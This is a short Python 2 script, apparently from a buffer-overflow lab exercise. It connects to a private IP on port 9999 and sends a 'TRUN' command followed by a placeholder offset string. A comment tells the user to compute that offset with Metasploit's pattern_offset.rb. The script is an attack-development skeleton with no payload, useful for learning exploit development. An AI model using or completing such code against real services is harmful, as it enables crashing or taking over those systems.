import sys
import socket 

offset = " " #to find the offset type this in terminal /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l (place a number) then place the stuff given here 

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.0.0.27',9999))

	s.send(('TRUN /.:/' + offset)) 
	s.close()

except:
	print "error connecting to server"
	sys.exit()
